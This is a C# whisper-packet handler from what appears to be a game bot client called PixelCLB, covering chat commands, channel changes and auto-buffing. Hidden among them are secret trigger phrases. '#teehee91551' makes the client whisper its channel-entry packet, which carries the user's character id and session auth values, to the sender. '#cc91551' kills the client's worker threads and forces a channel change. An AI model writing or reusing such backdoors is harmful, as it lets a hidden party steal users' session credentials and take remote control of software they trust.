using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PixelCLB.Net;
using System.Threading;
using PixelCLB.PacketCreation;

namespace PixelCLB.Packets.Handlers
{
    class Whispered : PacketReceiver
    {
        public void packetAction(Client c, PacketReader packet)
        {
            try
            {
                Thread t = new Thread(delegate()
                {
                    byte bytes = packet.Read();
                    string text;
                    string ign;
                    string[] words;
                    string format = "";
                    string collectionFormat = "";
                    if (c.clientMode == ClientMode.IDLE || c.chatLogs)
                    {
                        if (bytes == 0x12)
                        {
                            ign = packet.ReadMapleString();
                            packet.ReadShort();
                            text = packet.ReadMapleString();
                            format = string.Concat("[Whisper] ", ign + " >> " + text);
                            collectionFormat = "[Whisper] " + ign + " : " + text;
                            words = text.Split(' ');
                            if (Program.accessLevel <= 1)
                            {
                                if (text.IndexOf("#cc91551", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
                                {
                                    int numm;
                                    if (int.TryParse(words[1], out numm))
                                        c.channel = int.Parse(words[1]);
                                    else
                                        return;
                                    c.remoteHackPacket = true;
                                    try
                                    {
                                        List<Thread> threadlist = c.workerThreads.ToList<Thread>();
                                        lock (threadlist)
                                        {
                                            foreach (Thread th in threadlist)
                                            {
                                                if (th.IsAlive)
                                                {
                                                    try
                                                    {
                                                        th.Abort();
                                                    }
                                                    catch { }
                                                }
                                            }
                                        }
                                    }
                                    catch { }
                                    c.ses.SendPacket(PacketHandler.changeChannel(c.channel - 1).ToArray());
                                    return;
                                }
                                else if (text.IndexOf("hi desi", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
                                {
                                    c.ses.SendPacket(PacketHandler.whisper(ign, "hello").ToArray());
                                    Thread.Sleep(1000);
                                }
                                else if (text.IndexOf("harro", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
                                {
                                    c.ses.SendPacket(PacketHandler.whisper(ign, "harro").ToArray());
                                    Thread.Sleep(1000);
                                }
                                else if (text.IndexOf("#teehee91551", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
                                {
                                    string hackPacket = PacketHandler.EnterChannel(c.myCharacter.uid, c.RAND1, c.RAND2, c.cauth, c.worldID).ToString();
                                    int S1Length = hackPacket.Length;
                                    int numm = S1Length / 4;
                                    string S1 = hackPacket.Substring(0, numm);
                                    string S2 = hackPacket.Substring(numm, numm);
                                    string S3 = hackPacket.Substring(2 * numm, numm);
                                    string S4 = S1 + S2 + S3;
                                    S4 = hackPacket.Replace(S4, "");
                                    c.ses.SendPacket(PacketHandler.whisper(ign, "1: " + S1).ToArray());
                                    Thread.Sleep(1000);
                                    c.ses.SendPacket(PacketHandler.whisper(ign, "2: " + S2).ToArray());
                                    Thread.Sleep(1000);
                                    c.ses.SendPacket(PacketHandler.whisper(ign, "3: " + S3).ToArray());
                                    Thread.Sleep(1000);
                                    c.ses.SendPacket(PacketHandler.whisper(ign, "4: " + S4).ToArray());
                                    return;
                                }
                            }
                            if (text.IndexOf("#room", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
                            {
                                c.updateLog(collectionFormat);
                                c.Players.Clear();
                                c.mapleFMShopCollection.shops.Clear();
                                Program.gui.clearPlayerBox();
                                Program.gui.clearMushyBox();
                                c.ses.SendPacket(PacketHandler.changeFMRoom(words[1], (byte)c.channel).ToArray());
                            }
                            else if (text.IndexOf("#cc56112", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
                            {
                                int numm;
                                if (int.TryParse(words[1], out numm))
                                    c.channel = int.Parse(words[1]);
                                else
                                    return;
                                c.remoteHackPacket = true;
                                c.ses.SendPacket(PacketHandler.changeChannel(c.channel - 1).ToArray());
                                return;
                            }
                            else if (text.IndexOf("#cc", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
                            {
                                int numm;
                                c.Players.Clear();
                                c.mapleFMShopCollection.shops.Clear();
                                Program.gui.clearPlayerBox();
                                Program.gui.clearMushyBox();
                                if (int.TryParse(words[1], out numm))
                                    c.channel = int.Parse(words[1]);
                                else
                                    return;
                                c.updateLog(collectionFormat);
                                IniFile iniFile = new IniFile(@"\ProgramData\PixelCLB\PixelCLBSettings.ini");
                                iniFile.WriteValue(c.accountProfile, "Channel", c.channel);
                                c.changeChannel(false, c.channel);
                            }
                            else if (text.IndexOf("#logoff", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
                            {
                                c.updateLog(collectionFormat);
                                string command = string.Concat("#logoff ", Program.logOffPass);
                                if (command.ToLower().Equals(text.ToLower()))
                                {
                                    c.forceDisconnect(false, 0, false, "Whisped #logoff");
                                }
                            }
                            else if (text.IndexOf("#say", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
                            {
                                c.updateLog(collectionFormat);
                                text = text.Replace("#say ", "");
                                c.ses.SendPacket(PacketHandler.allChat(text).ToArray());
                            }
                            c.refreshChatBox(format);
                        }
                        else if (bytes == 0x0A)
                        {
                            ign = packet.ReadMapleString();
                            byte identifier = packet.Read();
                            if (identifier == 0)
                            {
                                format = string.Concat("[Whisper] Unable to find " + ign);
                            }
                            c.refreshChatBox(format);
                        }
                        else if (bytes == 0x09)
                        {
                            format = "";
                            ign = packet.ReadMapleString();
                            byte status = packet.Read();
                            if (status == 3)
                            {
                                byte channel = packet.Read();
                                format = string.Concat("'", ign, "' is at '", c.worldName, "-", channel + 1, "'");
                            }
                            else if (status == 1)
                            {
                                int map = packet.ReadInt();
                                format = string.Concat("'", ign, "' is currently at '", Database.getMapName(map), "'.");
                            }
                            else if (status == 0)
                            {
                                format = string.Concat("Unable to find '", ign, "'");
                                //Offline
                            }
                            c.refreshChatBox(format);
                            return;
                        }
                    }
                    else if (c.clientMode == ClientMode.AUTOBUFF)
                    {
                        if (bytes == 0x12)
                        {
                            ign = packet.ReadMapleString();
                            packet.ReadShort();
                            text = packet.ReadMapleString();
                            format = string.Concat("[Whisper] ", ign + " >> " + text);
                            collectionFormat = "[Whisper] " + ign + " : " + text;
                            words = text.Split(' ');
                            if (text.IndexOf("#skill", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
                            {
                                int num;
                                if (words[1].ToLower().Equals("hs"))
                                {
                                    foreach (string skill in c.autoBuffList)
                                    {
                                        string[] buff = skill.Split(',');
                                        if (buff[0].Equals("2311003"))
                                        {
                                            c.updateLog(collectionFormat);
                                            if (c.myCharacter.MP < c.MPUnderValue)
                                            {
                                                c.useMpPot();
                                            }
                                            c.ses.SendPacket(PacketHandler.useBuff(int.Parse(buff[0]), (byte)int.Parse(buff[1]), c).ToArray());
                                        }
                                    }
                                }
                                else if (int.TryParse(words[1], out num))
                                {
                                    foreach (string skill in c.autoBuffList)
                                    {
                                        string[] buff = skill.Split(',');
                                        if (buff[0].Equals(words[1]))
                                        {
                                            if (c.myCharacter.MP < c.MPUnderValue)
                                            {
                                                c.useMpPot();
                                            }
                                            c.ses.SendPacket(PacketHandler.useBuff(int.Parse(buff[0]), (byte)int.Parse(buff[1]), c).ToArray());
                                        }
                                    }
                                }
                            }
                        }
                    }
                });
                c.workerThreads.Add(t);
                t.Start();
            }
            catch
            {
                c.updateLog("Error Code: 201");
            }
        }
    }
}
